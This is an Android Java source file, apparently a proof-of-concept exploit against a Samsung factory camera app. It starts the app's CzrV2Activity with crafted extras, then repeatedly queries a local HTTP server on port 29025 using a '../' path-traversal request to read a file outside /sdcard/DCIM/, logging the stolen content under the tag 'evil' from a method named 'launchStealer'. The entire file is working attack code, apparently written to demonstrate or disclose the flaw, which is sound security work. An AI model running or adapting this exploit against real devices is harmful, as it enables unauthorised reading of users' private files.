package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import org.apache.commons.io.IOUtils;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final String relativePath = "../test.txt"; // base path is /sdcard/DCIM/
        new Thread(() -> launchStealer(relativePath)).start();

        Intent i = new Intent();
        i.setClassName("com.sec.factory.cameralyzer", "com.sec.factory.cameralyzer.CzrV2Activity");
        i.putExtra("hashsign", "q");
        i.putExtra("testtype", "q");
        startActivity(i);
    }

    private void launchStealer(String relativePath) {
        while (true) {
            try {
                HttpURLConnection connection = (HttpURLConnection) new URL("http://127.0.0.1:29025/DCIM/" + relativePath).openConnection();
                InputStream inputStream = connection.getInputStream();
                Log.d("evil", "Response: " + IOUtils.toString(inputStream));
                inputStream.close();
                connection.disconnect();
                return;
            } catch (Throwable th) {
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    return;
                }
            }
        }
    }
}